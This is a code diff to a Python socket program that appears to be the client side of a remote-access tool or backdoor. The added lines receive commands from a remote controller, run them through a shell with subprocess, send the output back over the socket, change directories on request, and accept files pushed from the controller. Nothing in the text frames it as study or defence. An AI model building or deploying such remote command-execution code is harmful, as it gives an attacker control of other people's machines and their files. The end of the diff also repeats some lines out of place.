@@ -17,7 +17,8 @@ def clienthandler(my_socket):
          
          if cmd == "02" or cmd =="2":
              download_file(my_socket)    
-             
+             continue
+              
          if cmd == "03" or cmd =="3":
              upload_file_folder(my_socket)
          if cmd == "04" or cmd =="4":
@@ -44,6 +45,30 @@ def exe_commads(my_socket):
              my_socket.send_data(runshell("pwd"))
          if cmd[:2]=='cd':
              os.chdir(cmd[3:])
+             my_socket.send_data(runshell("pwd"))
+             
+         if cmd[:5] =="chdir":
+             os.chdir(cmd[6:])
+             my_socket.send_data(runshell("pwd"))
+         else :
+             res = runshell(cmd)
+             my_socket.send_results(res)
+             
+def runshell(cmd):
+     output = subprocess.run(cmd , shell=True, capture_output=True)
+     if output.stderr.decode("utf-8")=="":
+         std_out = output.stdout.decode("utf-8")
+     else :
+         std_out = output.stderr.decode("utf-8")
+     return std_out
+ 
+ 
+def download_file(my_socket):
+     print("[+] Downloading File")
+     filename=my_socket.recv_data()
+     my_socket.recv_file(filename)
+     
+
              my_socket.send_data(runshell("pwd"))
              
          if cmd[:5] =="chdir":
